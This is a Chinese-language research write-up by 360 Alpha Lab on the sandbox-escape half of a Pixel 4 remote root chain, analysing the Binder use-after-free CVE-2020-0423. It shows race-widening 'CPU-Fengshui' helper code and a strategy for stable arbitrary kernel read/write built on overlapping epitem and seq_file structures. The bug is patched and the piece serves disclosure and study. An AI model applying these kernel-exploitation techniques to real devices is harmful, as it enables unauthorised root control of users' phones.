**作者：360 Alpha Lab 韩洪立，简容，王晓东，周鹏  
原文链接：<https://vul.360.net/archives/217>**

> 在2020年7月，我们向谷歌上报了一条远程ROOT利用链，该利用链首次实现了针对谷歌旗舰机型Pixel
> 4的一键远程ROOT，从而在用户未察觉的情况下实现对设备的远程控制。截至漏洞公开前，360 Alpha
> Lab已协助厂商完成了相关漏洞的修复。该漏洞研究成果也被2021年BlackHat
> USA会议收录，相关资料可以[这里](https://www.blackhat.com/us-21/briefings/schedule/#typhoon-> mangkhut-one-click-remote-universal-root-formed-with-two-> vulnerabilities-22946)找到。
> **该项研究成果也因其广泛的影响力在谷歌2020年官方漏洞奖励计划年报中得到了公开致谢，并斩获“安全界奥斯卡”Pwnie
> Awards的“史诗级成就”和“最佳提权漏洞”两大奖项的提名。这条利用链也因其广泛的影响力被我们命名为“飓风山竹”。**

在上一篇[文章](https://vul.360.net/archives/144)中，我们已经介绍了利用链的RCE部分，因此这篇文章将介绍利用链的沙箱提权部分。本文将首先对沙箱提权所使用的Binder驱动漏洞（CVE-2020-0423）进行分析，然后介绍在沙箱环境中提权遇到的挑战及对应的解决方案，最后是我们对这部分内核漏洞利用的总结。

## Introduction

Binder是安卓系统中最为核心且广泛使用的进程间通信方式，这使得系统设计者需要保证上层应用在各种场景下能够正常调用Binder驱动接口，包括限制最为严格的沙箱环境。近年来，Binder模块先后爆出了多个被证实可以被利用的漏洞，包括我们在2019年发现的“水滴”漏洞（CVE-2019-2025），这个漏洞影响了2016年11月~2019年3月的安卓系统。在此之后，CVE-2019-2215，谷歌Project
Zero团队于2019年9月发现该漏洞存在1-day在野利用，影响Pixel
2及以下机型，后于2019年10月安全公告中修补。CVE-2020-0041，由bluefrostsec团队发现，是一枚OOB类型的漏洞，影响了2019年2月~2020年3月的安卓系统，影响的设备包括运行Android
10的Pixel 4及Pixel 3/3a
XL。除去这些被证实可被利用的漏洞之外，Binder模块也爆出了一些其他相关的安全问题。按照行业的相关研究结论，大概每1000~1500行代码中间便会存在一枚漏洞，而Binder驱动核心代码binder.c文件中只有不到6000行代码。这不禁让我们有一个疑问，这个模块是否还存在此类漏洞呢？这也是本文将要介绍的CVE-2020-0423，也是利用链中使用的沙箱逃逸提权漏洞。利用该漏洞实现了仅触发一次漏洞就拿到了稳定的任意地址读写元语，可直接从沙箱逃逸提权至ROOT。实现了仅用两枚漏洞就打通了整条利用链，且该利用方案具备通用性。下文将会将其技术实现细节详细的分享给大家，以期能够促进攻防技术的共同进步。

## The Bug

一个典型的Binder通信过程大致分为四步：  
（1）Client发送BC_TRANSACTION命令到内核；  
（2）内核经过处理之后把BC_TRANSACTION转发到Server；  
（3）Server接收到BC_TRANSACTION后开始处理任务，处理完成之后通过BC_REPLY命令把结果返回到内核；  
（4）内核经过处理之后把BC_REPLY结果转发给Client。

Binder进程间通信模型:

![](https://images.seebug.org/content/images/2021/08/295b12cd-acc9-4b7c-a9f0-09c26b49f6ff.png-w331s)

Binder支持多种[类型](https://android.googlesource.com/kernel/msm/+/refs/heads/android-msm-crosshatch-4.9-android10/include/uapi/linux/android/binder.h)的对象传递，该漏洞和BINDER_TYPE_BINDER类型的对象传递有关。在如下所示的代码中，首先构造一个flat_binder_object结构体，然后通过BC_TRANSACTION命令发送到内核。

    
    
    int send_service_handle(struct binder_state *bs, uint32_t target, int code, int handle)
    {
        struct flat_binder_object binder_obj; 
        uint64_t offsets = 0;
        int obj_size = sizeof(struct flat_binder_object);
        int offset_size = sizeof(uint64_t);
        int res;
    
        binder_obj.hdr.type = BINDER_TYPE_BINDER;
        binder_obj.binder = handle;
        binder_obj.cookie = 0xbbbbbbbb;
    
        res = send_transaction(bs, target, code, &binder_obj, obj_size, &offsets, offset_size);
        return res;
    }

一般情况下，当内核接收到BINDER_TYPE_BINDER对象后，会将其[转换](https://android.googlesource.com/kernel/msm/+/refs/heads/android-msm-crosshatch-4.9-android10/drivers/android/binder.c#3439)成一个binder_node。在转换的过程中，binder_node结构体中类型为binder_work的成员work将以指针形式插入到当前线程对应的todo链表中。同时内核还会给该binder_node创建对应的binder_ref，这样Server端进程就可以通过该binder_ref找到对应的binder_node。如下图所示，work会被链接到thread->todo
链表上。

![](https://images.seebug.org/content/images/2021/08/d74d9ce6-44c1-45aa-9bb4-62cebe8bc7ac.png-w331s)

那么Server可以用这个binder_ref来做什么呢？当Server在使用完对应的binder_obj之后，会给内核[发送](https://cs.android.com/android/platform/superproject/+/android-10.0.0_r1:frameworks/native/cmds/servicemanager/binder.c;l=287)BC_BUFFER_FREE命令。当内核收到该命令后，就会根据该binder_ref找到对应的binder_node，然后减少引用计数器。当计数器变成0时，该binder_node就会被释放掉。

![](https://images.seebug.org/content/images/2021/08/7454c7ea-3c61-4198-ad00-f688c6e8964c.png-w331s)

与此同时，Client端也能通过发送BINDER_THREAD_EXIT命令访问到这个binder_work对象。这个命令最终会调用到binder_release_work函数，该函数代码如下所示。在代码[1]处，先从todo链上取出binder_work，这里有锁保护，不存在竞争问题。在代码[2]处，会根据binder_work的type进行相应的清理工作，但是这里没有锁保护。

    
    
    static void binder_release_work(struct binder_proc *proc,
                    struct list_head *list)
    {
        struct binder_work *w;
    
        while (1) {
            w = binder_dequeue_work_head(proc, list);   // [1]从链上取出w时有锁保护
            if (!w)
                return;
    
            switch (w->type) {                          // [2]这里没有锁保护，竞争成功会导致UAF问题
            ...
        }
    }

因此，Client和Server之间存在条件竞争问题。这个过程可以分为几步：  
1、Client发送BINDER_THREAD_EXIT命令，然后从todo链上取出w；  
2、Server发送BC_BUFFER_FREE命令，内核根据binder_ref找到binder_node，并减少引用计数至0，使得binder_node被释放掉；  
3、此时binder_work所处内存已经处于释放状态，Client访问w->type就会导致UAF。

![](https://images.seebug.org/content/images/2021/08/96f231fc-a3f7-4d22-ac4f-5a66f900860e.png-w331s)

## Exploitation

> 前面我们分析了CVE-2020-0423漏洞的原理，接下来我们将给大家介绍如何利用这个漏洞以及这个过程中遇到的一些挑战。

### How to exploit the bug?

经过上面的分析，我们知道这是一个UAF漏洞。这种类型的漏洞利用的关键是Use点，从binder_release_work函数的实现可以看到，这里如果我们可以通过堆喷控制type，switch(w->type)就会进入我们需要的分支。

    
    
    4575 static void binder_release_work(struct binder_proc *proc,
    4576                 struct list_head *list)
    4577 {
    4578     struct binder_work *w;
    4579  
    4580     while (1) {
    4581         w = binder_dequeue_work_head(proc, list);
    4582         if (!w)  <---------------------------------------------- [1]
    4583             return;
    4584  
    4585         switch (w->type) { <------------------------------------ [2]
    4586         case BINDER_WORK_TRANSACTION: {
    4587             struct binder_transaction *t;
    4588  
    4589             t = container_of(w, struct binder_transaction, work);
    4590  
    4591             binder_cleanup_transaction(t, "process died.",
    4592                            BR_DEAD_REPLY);
    4593         } break;
    4594         case BINDER_WORK_RETURN_ERROR: {
    4595             struct binder_error *e = container_of(
    4596                     w, struct binder_error, work);
    4597  
    4598             binder_debug(BINDER_DEBUG_DEAD_TRANSACTION,
    4599                 "undelivered TRANSACTION_ERROR: %u\n",
    4600                 e->cmd);
    4601         } break;
    4602         case BINDER_WORK_TRANSACTION_COMPLETE: {
    4603             binder_debug(BINDER_DEBUG_DEAD_TRANSACTION,
    4604                 "undelivered TRANSACTION_COMPLETE\n");
    4605             kfree(w);
    4606             binder_stats_deleted(BINDER_STAT_TRANSACTION_COMPLETE);
    4607         } break;
    4608         case BINDER_WORK_DEAD_BINDER_AND_CLEAR:
    4609         case BINDER_WORK_CLEAR_DEATH_NOTIFICATION: {
    4610             struct binder_ref_death *death;
    4611  
    4612             death = container_of(w, struct binder_ref_death, work);
    4613             binder_debug(BINDER_DEBUG_DEAD_TRANSACTION,
    4614                 "undelivered death notification, %016llx\n",
    4615                 (u64)death->cookie);
    4616             kfree(death);
    4617             binder_stats_deleted(BINDER_STAT_DEATH);
    4618         } break;
    4619         default:
    4620             pr_err("unexpected work type, %d, not freed\n",
    4621                    w->type);
    4622             break;
    4623         }
    4624     }
    4626 }

首先，我们假定binder_node对应的地址是 **X** 。根据上面的代码，不同的type值可能导致不同的结果：

（1）type是BINDER_WORK_TRANSACTION，可能触发double-free问题，但需要满足较为苛刻的条件，较难控制；

（2）type是BINDER_WORK_RETURN_ERROR，没有实际影响；

（3）type是BINDER_WORK_TRANSACTION_COMPLETE、BINDER_WORK_DEAD_BINDER_AND_CLEAR和BINDER_WORK_CLEAR_DEATH_NOTIFICATION之一，导致
**X+8** 被释放；

（4）剩下的情况将直接进入default分支。

综合来看场景（3）流程较为简单，具备较好的可利用性。

### **Vision of kernel from sandbox process**

由于Binder模块的特点，通过它可以搭建一条从沙箱进程通往内核的桥梁，但在这条通道上仍有着各种各样的安全策略来保证系统安全稳定的运行。正常情况下我们只能完成一些被规则允许的事情，而我们发现的这枚漏洞便有可能成为这规则之外的”力量”。我们需要避开这一系列的检查，与这一“力量”完成一系列的协作、布局，逐步完成对关键元素控制，并最后一举拿下内核的控制权。但想要完成这一切并不容易，在高度沙箱化的进程中实现逃逸一直以来都是极具挑战性的目标，无论是在各类国际赛事中，还是从安卓历史上来看，在Pixel系列机型上能够实现沙箱逃逸都能称得上是高难度目标，而能够直接提权至ROOT权限的案例就更是罕见。这主要是由于沙箱进程中一系列限制导致的：

**极少的攻击面**

在安卓中只有极少的几个服务还可以与沙箱中进程通信，我们可以看一下在Android 10上isolated_app域selinux的规则：

    
    
    system/sepolicy/private/isolated_app.te
    # b/17487348
    # Isolated apps can only access three services,
    # activity_service, display_service, webviewupdate_service, and
    # ashmem_device_service.
    neverallow isolated_app {
        service_manager_type
        -activity_service
        -ashmem_device_service
        -display_service
        -webviewupdate_service
    }:service_manager find;

而到了Android
11上，ashmem_device_service被从中移出，沙箱中进程无法再直接通过请求ashmem_device_service来创建一片ashmem。

在这为数不多的几个可访问的Binder服务中，其中的大部分接口调用还会有进步一步的强制检查来进行封堵。以activity_service为例，在从servicemanager获取Binder代理后，通过该代理大部分接口都会调用enforceNotIsolatedCaller()来检查是否为isolated
app，对于isolated_app域的进程会直接抛出安全检查异常。

    
    
    frameworks/base/services/core/java/com/android/server/am/ActivityManagerService.java
    public class ActivityManagerService extends IActivityManager.Stub
            implements Watchdog.Monitor, BatteryStatsImpl.BatteryCallback {
        ... skip ...
        private void enforceNotIsolatedCaller(String caller) {
            if (UserHandle.isIsolated(Binder.getCallingUid())) {
                throw new SecurityException("Isolated process not allowed to call " + caller);
            }
        }
        ... skip ...
        @Override
        public boolean clearApplicationUserData(final String packageName, boolean keepState,
                final IPackageDataObserver observer, int userId) {
            enforceNotIsolatedCaller("clearApplicationUserData");
            int uid = Binder.getCallingUid();
            int pid = Binder.getCallingPid();
            final int resolvedUserId = mUserController.handleIncomingUser(pid, uid, userId, false,
                    ALLOW_FULL_ONLY, "clearApplicationUserData", null);
            ... skip ...
        }
        ... skip ...
    }

而我们发现的这枚CVE-2020-0423漏洞并不担心这个问题，因为其触发条件受限极低，仅需能与任意一个Binder服务能够通信即可，这意味着我们可以通过借助这些能够被访问的Binder服务来触发漏洞。

**• 有限的系统调用**

诸如绑定CPU这类系统调用在沙箱中不再被支持，这对于利用一些条件竞争类型的UAF漏洞可能会造成限制。

**• 受限的文件/设备访问权限**

沙箱进程有着极为严格的约束限制，来保证即便通过浏览器入口实现了远程代码执行，在沙箱中也面临寸步难行的囧地。尤其是对于文件或设备的写操作有着极为严格的限制。

**• 更多的安全防护措施**

安卓系统在设计上采用了最小化权限准则，除了约束极为严格的selinux策略，在沙箱进程中还采用了BPF安全机制，设备了白名单机制，只有必要的系统的调用才会被加到这个名单中。这也使得我们在编写漏洞利用时常用的一些系统调用，如CPU/socket/相关的堆喷函数都无法再被调用。

**• 在32位的Chrome渲染进程中攻击64位kernel**

同一系统调用，32位和64位场景下特性不一致，这在实际编写漏洞利用时会遇到很多意料之外的麻烦，甚至导致一些接口无法使用。同时，对于镜像攻击这类方法在沙箱进程中无法施展，32位的地址空间是无法构造出镜像攻击所需的条件。

安卓内核的经过多年的攻防对抗，其安全性得到了极大的提高，先后引入了包括SELinux, PXN, PAN, KASLR,
CFI等一系列防护。想利用这样一枚自身存在诸多限制的条件竞争型漏洞在沙箱进程中成功完成一系列的提权操作，并能稳定控制住内核，听起来总有点crazy。这就像在物资极其匮乏的条件下造这枚“核弹头”，不过好在我们拥有最核心的原料——漏洞。安卓内核经历了多年的攻防对抗，现有的利用技术也多被封堵，在代表当时谷歌安卓最高防御水平的旗舰机型Pixel
4上实现这样一条利用链，也唯有出奇，才能致胜。接下来的章节会将会带着大家再度领略这条漏洞利用之路。

### How to spray?

对于尝试利用这类UAF类型的漏洞，第一步依然是从堆喷、劫持执行流开始。我们在上面的章节中讨论了漏洞转化的方向，下一步是选择堆喷方案。我们必须代码[1]和代码[2]这个竞争窗口之间完成三个动作：  
1、把binder_node释放掉；  
2、把释放的slab申请回来；  
3、修改type对应的内存。  
但这个漏洞留给我们的竞争窗口非常窄，所以我们面临的第一个问题就是： **如何在非常窄的竞争窗口中通过堆喷控制type？**

我们有两种方案：1、 **扩大竞争窗口** ；2、 **让竞争场景出现的更频繁** 。

  * 对于第一种方案，我们在CVE-2019-2025“水滴”漏洞利用中使用过一种非常有效的方法。这个漏洞在触发的时候，会涉及到mutex锁unlock操作，这个操作最终会调用wake_up_q()函数去唤醒等待同一个mutex锁的线程。如果我们触发漏洞的线程与另一个线程（等待同一个互斥锁）绑定到同一个CPU上，在当前线程调用unlock的时候便会唤醒另一个线程，也就是当前线程会主动让出CPU，这就给我们留下了足够多的时间来完成释放以及后续的堆喷操作。不过，这个方法并不适用于spinlock。
  * 对于第二种方案，常规的解决方案是将存在条件竞争的线程和堆喷的线程绑定到多核CPU的一个核上去执行。 `bool bind_cpu(int cpu) { cpu_set_t set;CPU_ZERO(&set); CPU_SET(cpu, &set); if (sched_setaffinity(0, sizeof(set), &set) < 0) { log_err("sched_setafinnity(): %s\n", strerror(errno)); return false; } return true;}`

因为不具备第一种方案的条件，所以我们只能使用第二种方案。为了验证这个方案的可行性，我们尝试先在untrusted_app域环境中进行测试，在绑定CPU的基础之上，我们找到了一个可以大幅提高堆喷成功率的方案。因为普通应用可以在untrusted_app域中注册Service，所以我们可以自己注册([参考](https://github.com/bluefrostsecurity/CVE-2020-0041/blob/master/lpe/src/endpoint.c))一个Service，这样Server端发送BC_BUFFER_FREE命令的时机就是完全可控的。接下来，把触发漏洞的Client线程、Service线程和堆喷（堆喷我们使用的是sendmsg接口，具体实现上参考了[bluefrostsecurity](https://github.com/bluefrostsecurity/CVE-2020-0041/blob/master/lpe/src/realloc.c)团队的实现方法）线程绑定到同一个CPU上。做完了这两步，再去用堆喷去修改w->type的成功率就会大大提高。

但是这个方案无法迁移到沙箱环境中，原因主要是两个：
1、箱中用于绑定CPU的系统调用被禁用了，这是比较关键的原因；2、沙箱环境中不能注册Service，我们只能使用系统原生的service_manager，这就导致释放binder_node的过程不可控。因此如果想要在沙箱中利用这个漏洞，必须要解决的第一个问题就是如何触发漏洞。在这个阶段，我们甚至不考虑使用堆喷去修改w->type，因为失去了绑定CPU这个功能的辅助，非常窄的竞争窗口使得漏洞触发变成了一件几乎不可能的事。在深入探索之后，我们成功的解决了这个问题，我们不仅可以尝试布局堆，也可以尝试布局CPU。我们熟悉的Heap-Fengshui更多的是从空间布局上来思考，而CPU-Fengshui更多的是从时间上思考，通过影响CPU调度来布局进程的在时间上的分布，这种方法也被我们称为CPU-Fengshui。通过CPU-Fengshui最终来实现各段代码逻辑在运行时间关系上的排列、布局，如果能通过有限的操作来达到布局CPU的效果，将会为漏洞利用的实现创造条件。

#### CPU-Fengshui

首先，我们需要思考一个问题—— **绑定CPU为什么能提高条件竞争的成功率？**

Android系统是一个基于Linux内核的分时系统，在分时系统中，内核会把一个时间段切割成多个CPU时间片，然后根据特定的调度算法把这些时间片分配给等待执行的线程。除非线程自己主动放弃CPU，每个线程在使用完自己的时间片后才会被强制让出CPU。因此，如果将多个存在竞争的线程绑定到同一个CPU上，内核为了保证每个线程都被调度到，那就必须提高切换线程的频率。线程切换频率越高，就越有可能在竞争窗口切换出去，从而给堆喷提供机会。沿着这个思路，我们在触发漏洞代码中引入了Padding线程。

    
    
    void *padding_thread(void *arg)
    {
        volatile int counter = 0;    
    
        set_thread_name("padding_thread");
        while(!exploit){
            counter++;
        }
    
        return NULL;
    }

不难看出，Padding线程是一个CPU密集型的线程，它唯一的操作就是对counter做自加一。在引入这个线程之后，我们发现就算没有CPU绑定，沙箱中也能通过堆喷修改type了，不过漏洞触发时间依旧不太理想。为了找到最优的Padding线程数量，我们在Pixel
4上做了一个简单的[实验](https://github.com/360AlphaLab/cpu-fengshui/blob/main/src/fengshui.c)。

![](https://images.seebug.org/content/images/2021/08/bbd9b720-0168-4172-89b2-a5ef1f250066.png-w331s)

从实验结果可以看到，随着Padding线程数量的增加，CPU切换线程的次数是在逐步增加的，但当线程数量超过25之后，这个值就进入了一个稳定的状态。再来看我们关心的漏洞触发线程（Race
Thread），当Padding线程数量介于0~25之间时，CPU切换到漏洞触发线程的次数会在一定范围内波动，但当它超过25之后，这个值就呈现明显的下降趋势。依据这些数据，我们可以得出一个结论：
**当Padding线程数量是25左右时，CPU切换最为频繁，同时漏洞触发线程获得CPU的次数也能达到一个较高的区间值。**

那么，如果将Padding线程数量设置为25，漏洞触发时间是否就是最短的呢？有趣的是，实验结果支持我们的结论。

**除了Padding线程数量可以影响漏洞触发时间之外，线程优先级也能作为一个变量来影响实验结果。**

    
    
    int setprio(int priority)
    {
        int ret;
    
        ret = setpriority(PRIO_PROCESS, syscall(__NR_gettid), priority);
        if (ret < 0)
            log_err("setpriority failed, ret %d\n", ret);
    
        return ret;
    }

通过这段代码，我们可以在沙箱中改变当前线程的优先级。 **因为优先级可以直接影响时间片的大小，所以理论上来说也会影响到漏洞触发的成功率**
。不过，我们没有通过实验进一步分析这个因素的实际影响，而是采用了一个经验值，因为此时实际的漏洞触发时间已经在可接受的范围内。在调用绑定CPU系统调用场景下，我们可以做到几秒钟时间触发漏洞，而在沙箱环境下，通过这一方法来模拟绑定CPU效果，也可以在十几秒之内成功触发漏洞。

#### Heap-Fengshui

解决了触发漏洞的问题，我们还需要解决堆布局的问题。在内核中，为了保证堆块的使用效率，内核在分配堆块的时候，每个CPU有自己所属的slab。也就是说，如果CPU-0释放了一个大小为128的slab，此时CPU-1去申请128大小的slab得到的堆块并不是CPU-0刚刚释放的slab，这个slab只有CPU-0自己才能申请回来。但在利用的时候，我们需要提前在内存里面按照特定填充特定的结构体并预留一些空洞。失去了绑定CPU功能的辅助，一个线程在某一时刻所处的CPU是不确定的，那也就意味着这个线程所做的堆块操作可能不会按照我们预想的方式进行。另一个问题是，我们没有办法控制漏洞在哪个CPU上成功触发，这就要求我们必须给每个CPU都准备独立的堆布局。

**如果我们知道线程当前所属CPU，然后再根据当前CPU去做相关的堆布局不就可以了吗？**

这样的思路是没有问题的，如果我们使用SYS_getcpu去获取当前CPU，这个问题就可以迎刃而解。但是，沙箱中不允许我们调用这个接口。经过一番探索，我们找到了一个文件`/proc/pid/stat`，该文件内容如下所示：

    
    
    1|blueline:/data/local/tmp $ cat /proc/self/stat                                            
    15752 (cat) R 13930 15752 13930 34816 15752 4194304 429 0 0 0 0 0 0 0 20 0 1 0 7227643 11032059904 798 18446744073709551615 428734074880 428734523136 549425406096 0 0 0 0 0 1073775864 0 0 0 17 6 0 0 0 0 0 428734545376 428734555736 429511938048 549425407612 549425407632 549425407632 549425410024 0

通过查看Linux帮助[文档](https://man7.org/linux/man-pages/man5/proc.5.html)，我们可以看到这样一段话：

    
    
    (39) processor  %d  (since Linux 2.2.8)
             CPU number last executed on.

为了确定这个值就是线程当前所处CPU，我们去查看了一下内核[代码](https://android.googlesource.com/kernel/msm/+/refs/heads/android-msm-crosshatch-4.9-android10/fs/proc/array.c#578)。从代码中可以看到，这个信息来自于task_cpu函数，也就是当前线程所属CPU。

    
    
        seq_put_decimal_ull(m, " ", 0);
        seq_put_decimal_ull(m, " ", 0);
        seq_put_decimal_ll(m, " ", task->exit_signal);
        seq_put_decimal_ll(m, " ", task_cpu(task));     <---------------- 获得线程所属CPU
        seq_put_decimal_ull(m, " ", task->rt_priority);
        seq_put_decimal_ull(m, " ", task->policy);

确定可以通过`/proc/self/stast`获取所属CPU之后，我们就可以基于特定CPU做堆布局了。

### Arbitrary address read/write model

能够成功实现对喷意味着我们可以控制w->type，从对该漏洞原理的分析，我们可以触发一个kfree(A+8)的操作。但沙箱中一系列的限制，使得现有的漏洞利用技术无法施展。对于这样一枚条件竞争类型的漏洞，面对内核的重重防护，如果需要多次触发漏洞，其稳定性、成功率、利用难度都会成为极大的问题。这让我们决定从漏洞利用模型的本源上再去重新思考，基于本质原理再寻他路。

#### **Case study**

我们总结了安卓ROOT历史上一些强大的漏洞利用方式，以其中的一些作为例子：

  * put_user/get_user，CVE-2013-6282， ARM平台没有校验地址合法性，使得攻击者可以通过这两个系统调用实现任意内核地址读写。
  * addr_limit + iovec， 将thread_info->addr_limit修改为0xFFFFFFFFFFFFFFFE来关掉内核对用户态及内核地址空间地址检查，进而实现稳定的任意地址读写。
  * mmap + ret2dir，最初在2014 USENIX会议上提出。用户态映射的内存会分配到内核的physmap区域，实际上达到了一种“看不见的”内存共享的效果。用户态和内核都可以按照各自的地址访问这片共享内存。
  * KSMA，通过创建新的页表项来达到一种物理内存共享的效果。
  * mmap + sysctl，最近在CVE-2020-0041漏洞利用中使用的方法.。通过在kern_table中插入一个新的节点，使该节点对应的结构体存储在用户态通过mmap分配的内存中，因而攻击者可在用户态直接修改该结构体的内容，同时结合sysctl文件自身的功能来实现稳定的任意地址写。

从上面这几个例子可以看到其中极为关键的两个基本元素，前两者为“内存共享”，第三个例子和第四个例子其实是基于“指针控制”，而第五个例子则是同时基于这两者。这是一个有趣的发现，这些利用方式从本质来看竟有着这般关联，而其本质原理竟如此简单。

#### **Arbitrary read/write model**

我们不妨基于这两个元素来构建模型。

  * 内存共享模型

![](https://images.seebug.org/content/images/2021/08/4d7a3dc8-711a-452e-85a0-362d310b3eab.png-w331s)

不用限定于具体的是哪种实现方式，需要使其达到物理内存共享的效果，对其中一者（Struct A）的改动可同步影响到另一者（Struct B）。

  * 指针控制模型

![](https://images.seebug.org/content/images/2021/08/0c898ac8-89a3-4917-80e6-b4baad5c97f5.png-w331s)

指针控制这种场景的关键在于找到含有指针成员变量的结构体，且该指针将被用于read/write业务逻辑，比较理想的场景是，可通过调用系统调用稳定的触发这一read/write业务逻辑。

#### Exploitation strategies

我们在内核源码，以及公开资料中寻找适用于这两种模型的结构体，最后发现了其中的三个结构体。这些结构体像化学试剂一样，单独存在时威力有限，而一旦将其按照一定的流程组合起来将会发生奇妙的化学反应，并爆发出强大的威力。

![](https://images.seebug.org/content/images/2021/08/e13fdf4e-8525-4406-aede-7ca823a09d65.png-w331s)

接下来我们来具体看一下这三个结构体的特点。

**• 基于Ashmem来实现任意地址读写**

    
    
    (gdb) pt /o struct file
    /* offset  */  type = struct file {
    ...skip…
    /*  184    */    u64 f_version;
    /*  192    */    void *f_security;
    /*  200    */    void *private_data;    <---------------- 尝试控制private_data
    /*  208    */    struct list_head {
    /*  208    */        struct list_head *next;
    /*  216    */        struct list_head *prev;
    
                           /* total size (bytes):   16 */
                           } f_ep_links;
    ...skip…
                           /* total size (bytes):  256 */
                        }

这里的private_data会被当做asma使用。

    
    
    static long ashmem_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
    {
        struct ashmem_area *asma = file->private_data;  <---------------- 在触发ashmem_ioctl()时，file->private_data会被赋值给asma
        long ret = -ENOTTY;
    
        switch (cmd) {
        case ASHMEM_SET_NAME:
            ret = set_name(asma, (void __user *)arg);
            break;
        case ASHMEM_GET_NAME:
            ret = get_name(asma, (void __user *)arg);
            break;
        ... skip ...
        return ret;
    }

在get_name()函数中可通过(1)(2)两处代码逻辑来实现任意地址读。

    
    
    static int get_name(struct ashmem_area *asma, void __user *name)
    {
      ... skip ...
      if (asma->name[ASHMEM_NAME_PREFIX_LEN] != '\0') {
         ... skip ...
        len = strlen(asma->name + ASHMEM_NAME_PREFIX_LEN) + 1;
        memcpy(local_name, asma->name + ASHMEM_NAME_PREFIX_LEN, len);    <---------------- (1)
      } else {
        len = sizeof(ASHMEM_NAME_DEF);
        memcpy(local_name, ASHMEM_NAME_DEF, len);
      }
       ... skip ...
      if (unlikely(copy_to_user(name, local_name, len)))    <---------------- (2)
        ret = -EFAULT;
      return ret;
    }

**基于ashmem来实现read**

之后可借助set_prot_mask()及set_name()中的两处代码逻辑实现任意地址写。

    
    
    static int set_prot_mask(struct ashmem_area *asma, unsigned long prot)
    {
      …skip…
      /* the user can only remove, not add, protection bits */
      if (unlikely((asma->prot_mask & prot) != prot)) {
        ret = -EINVAL;
        goto out;
      }
    
      /* does the application expect PROT_READ to imply PROT_EXEC? */
      if ((prot & PROT_READ) && (current->personality & READ_IMPLIES_EXEC))
        prot |= PROT_EXEC;
    
      asma->prot_mask = prot;    <---------------- 任意地址写
      …skip…
    }

也可通过调用set_name()来实现任意地址写。

    
    
    static int set_name(struct ashmem_area *asma, void __user *name)
    {
      ... skip ...
      len = strncpy_from_user(local_name, name, ASHMEM_NAME_LEN);
      if (len < 0)
        return len;
      if (len == ASHMEM_NAME_LEN)
        local_name[ASHMEM_NAME_LEN - 1] = '\0';
      mutex_lock(&ashmem_mutex);
      /* cannot change an existing mapping's name */
      if (unlikely(asma->file))
        ret = -EINVAL;
      else
        strcpy(asma->name + ASHMEM_NAME_PREFIX_LEN, local_name);    <---------------- 任意地址写
    
      mutex_unlock(&ashmem_mutex);
      return ret;
    }

**• 基于Seqfile来实现任意地址读写**

对于seq_file结构体可通过控制buf指针。

    
    
    struct seq_file                                                                        
    {
        char *buf;    <---------------- 尝试控制buf
        size_t size;
        size_t from;
        size_t count;
        size_t pad_until;
        loff_t index;
        loff_t read_pos;
        u64 version;
        struct mutex lock;
        const struct seq_operations *op;
        int poll_event;
        const struct file *file;
        void *private;
    };     

之后便可以借助seq_read()函数中所示代码逻辑实现任意地址读。

    
    
    ssize_t seq_read(struct file *file, char __user *buf, 
            size_t size, loff_t *ppos)
    {
        struct seq_file *m = file->private_data; <---------------- m为seq_file类型指针
        ... skip ...
        /* if not empty - flush it first */
        if (m->count) {
            n = min(m->count, size);
            err = copy_to_user(buf, m->buf + m->from, n);    <---------------- 任意地址读
            ... skip ...
        }
        /* we need at least one record in buffer */
        pos = m->index;
        p = m->op->start(m, &pos);
        ... skip ...
    }

调用系统调用comm_show()，通过(1)(2)(3)处所示代码逻辑便可以实现任意地址写。

    
    
    static int comm_show(struct seq_file *m, void *v)
    {
        struct inode *inode = m->private;
        struct task_struct *p;
        p = get_proc_task(inode);
        if (!p)
            return -ESRCH;
        task_lock(p);
        seq_printf(m, "%s\n", p->comm); // call seq_printf to write p->comm into seq_file->buf    <---------------- (1)
        task_unlock(p);                                                         
        put_task_struct(p);                                                     
        return 0;                                                               
    }
    
    void seq_printf(struct seq_file *m, const char *f, ...)
    {
        va_list args;
    
        va_start(args, f);
        seq_vprintf(m, f, args);    <---------------- (2)
        va_end(args);
    }
    EXPORT_SYMBOL(seq_printf);
    
    void seq_vprintf(struct seq_file *m, const char *f, 
                va_list args)
    {
        int len;
        if (m->count < m->size) {
            len = vsnprintf(m->buf + m->count, m->size - m->count, f, args);    <---------------- (3)
            if (m->count + len < m->size) {                                     
                m->count += len;
                return;
            }
        }
        seq_set_overflow(m);
    }

**• 基于Epitem来实现固定地址的任意写**

epitem和上面两个结构体不同，其data字段可通过调用系统调用epoll_ctl()来进行设置，这相当于实现了内核固定地址上稳定的8-bytes任意值写入。

    
    
    (gdb) pt /o struct epitem epitem                           
    /* offset    |  size */  type = struct epitem {
                           ... skip ...
    /*  112      |    16 */    struct epoll_event {
    /*  112      |     4 */        __u32 events;
    /* XXX  4-byte hole  */
    /*  120      |     8 */        __u64 data;    <---------------- 可通过调用系统调用稳定的修改data
                                   /* total size (bytes):   16 */
                               } event;
                               /* total size (bytes):  128 */
                             }  
    int pfd[2];
    int epoll_fd;
    struct epoll_event evt;
    
    pipe(pfd);
    epoll_fd = epoll_create1(0);
    epitem_add(epoll_fd, pfd[0]);
    
    bzero(&evt, sizeof(evt));
    evt.events = event;
    evt.data.u64 = data;
    epoll_ctl(ep, EPOLL_CTL_MOD, epoll_fd, &evt);

#### **Stable arbitrary read/write solution**

基于上面这两种模型，我们可以使用ashmem来搭建一个任意地址读写方案。

**通过ashmem搭建任意地址读写模型**

![](https://images.seebug.org/content/images/2021/08/bb8769df-d4fc-45eb-a810-9923cfa9af8c.png-w331s)

具体实现分为三步：

(1) 泄露file1结构体地址

(2) 泄露file2结构体地址

(3) 同时还需要配合一次任意写，将private_data1字段内容修改为private_data2所在地址

基于这个模型便可以通过调用上面提及的ashmem的读写系统调用来实现任意地址读写。但利用这枚漏洞来实现这个方案相对比较苛刻，是否还有更好的方案?答案依然是肯定的，这也是利用中采用的方案——仅通过一次漏洞触发就拿到了稳定任意地址读写元语。

**通过一次漏洞触发实现稳定任意值读写的方案**

![](https://images.seebug.org/content/images/2021/08/8f3c06ac-3285-4c06-a95e-353b15e6a404.png-w331s)

具体实现思路及其特点如下：

  * 通过内存布局 **使epitem的data字段和seq_file的buf字段重叠**
  * epitem与seqfile结构体大小都是 128，可以被分配到同一个页上
  * double-free后刚好可以构造出一个kfree(A+8)的场景
  * 不需要预先泄露任何信息或配合地址写能力
  * 搭建完成这套方案便具备了稳定的任意地址读写能力。在拥有这样的能力后，从某种意义上讲已经实现了提权。

这个方案从原理上非常强大，但在实际实现时仍然会遇到一些问题。首先遇到的就是堆风水布局问题。

### Trouble when doing heap fengshui

